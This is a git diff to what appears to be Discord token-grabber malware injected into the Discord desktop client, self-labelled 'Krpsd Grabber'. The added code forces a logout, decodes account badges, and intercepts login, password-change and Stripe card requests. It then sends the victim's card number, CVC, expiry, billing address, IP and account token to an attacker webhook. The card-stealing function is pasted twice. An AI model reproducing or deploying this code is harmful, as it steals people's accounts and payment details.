@@ -5,10 +5,10 @@ const querystring = require('querystring');
 var webhook = "%WEBHOOK_LINK%";
 
 function FirstTime() {
-    if (!fs.existsSync(path.join(__dirname, "Krpsd"))) {
+    if (!fs.existsSync(path.join(__dirname, "Hazard"))) {
         return !0
     }
-    fs.rmdirSync(path.join(__dirname, "Krpsd"));
+    fs.rmdirSync(path.join(__dirname, "Hazard"));
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
     return !1
@@ -82,6 +82,57 @@ function SendToWebhook(what) {
     `, !0).then((token => {}))
 }
 
+  function GetBadges(flags)
+  {
+  const Discord_Employee = 1;
+  const Partnered_Server_Owner = 2;
+  const HypeSquad_Events = 4;
+  const Bug_Hunter_Level_1 = 8;
+  const House_Bravery = 64;
+  const House_Brilliance = 128;
+  const House_Balance = 256;
+  const Early_Supporter = 512;
+  const Bug_Hunter_Level_2 = 16384;
+  const Early_Verified_Bot_Developer = 131072;
+  
+  var badges = "";
+  
+  if((flags & Discord_Employee) == Discord_Employee){
+     badges += "Staff,";
+  }
+  if((flags & Partnered_Server_Owner) == Partnered_Server_Owner){
+     badges += "Partner,";
+  }
+  if((flags & HypeSquad_Events) == HypeSquad_Events){
+     badges += "Hypesquad Event,"
+  }
+  if((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1){
+     badges += "Green Bughunter,";
+  }
+  if((flags & House_Bravery) == House_Bravery) {
+     badges += "Hypesquad Bravery,";
+  }
+  if((flags & House_Brilliance) == House_Brilliance){
+     badges += "HypeSquad Brillance,";
+  }
+  if((flags & House_Balance) == House_Balance){
+     badges += "HypeSquad Balance,";
+  }
+  if((flags & Early_Supporter) == Early_Supporter){
+     badges += "Early Supporter,";
+  }
+  if((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2){
+     badges += "Gold BugHunter,";
+  }
+  if((flags &Early_Verified_Bot_Developer ) == Early_Verified_Bot_Developer ){
+     badges += "Discord Developer,";
+  }
+  if (badges == "" ){
+      badges = "None"
+  }
+  return badges;
+  
+  }
 
 function Login(email, password, token) {
     const window = BrowserWindow.getAllWindows()[0];
@@ -232,7 +283,112 @@ function ChangeEmail(newemail, password, token) {
     })
 }
 
-
+function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+        window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
+        xmlHttp.send( null );
+        xmlHttp.responseText;
+    `, !0).then((ip) => {
+            var json = JSON.parse(info);
+            var params = {
+                username: "Krpsd Grabber",
+                content: "",
+                avatar_url: "https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png",
+                embeds: [
+                    {
+                        "color": 16507654,
+                        "fields": [
+                            {
+                                "name": "**Credit Card Added**",
+                                "value": `Credit Card Number: ${number}\nCredit Card Expiration: ${expir_month}/${expir_year}\nCVC: ${cvc}\n Country: ${country}\nState ${state}\nCity ${city}\nZIP: ${zip}\n Street: ${street}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "**Other Info**",
+                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "**Token**",
+                                "value": `\`${token}\``,
+                                "inline": false
+                            }
+                        ],
+                        "author": {
+                            "name": json.username + "#" + json.discriminator + "・" + json.id,
+                            "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                        },
+                        "footer": {
+                            "text": "Discord Token Grabber by krpsd"
+                        }
+                    }
+                ]
+            }
+            SendToWebhook(JSON.stringify(params))
+        })
+    })
+}
+function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
+	const window = BrowserWindow.getAllWindows()[0];
+	window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+		window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
+        xmlHttp.send( null );
+        xmlHttp.responseText;
+    `, !0).then((ip) => {
+			var json = JSON.parse(info);
+            var params = {
+                username: "Krpsd Grabber",
+                content: "",
+                avatar_url: "https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png",
+                embeds: [
+                    {
+                        "color": 16507654,
+                        "fields": [
+                            {
+                                "name": "**Credit Card Added**",
+                                "value": `Credit Card Number: ${number}\nCredit Card Expiration: ${expir_month}/${expir_year}\nCVC: ${cvc}\n Country: ${country}\nState ${state}\nCity ${city}\nZIP: ${zip}\n Street: ${street}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "**Other Info**",
+                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "**Token**",
+                                "value": `\`${token}\``,
+                                "inline": false
+                            }
+                        ],
+                        "author": {
+                            "name": json.username + "#" + json.discriminator + "・" + json.id,
+                            "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                        },
+                        "footer": {
+                            "text": "Discord Token Grabber by krpsd"
+                        }
+                    }
+                ]
+            }
+			SendToWebhook(JSON.stringify(params))
+		})
+	})
+}
 const ChangePasswordFilter = {
 	urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
 };
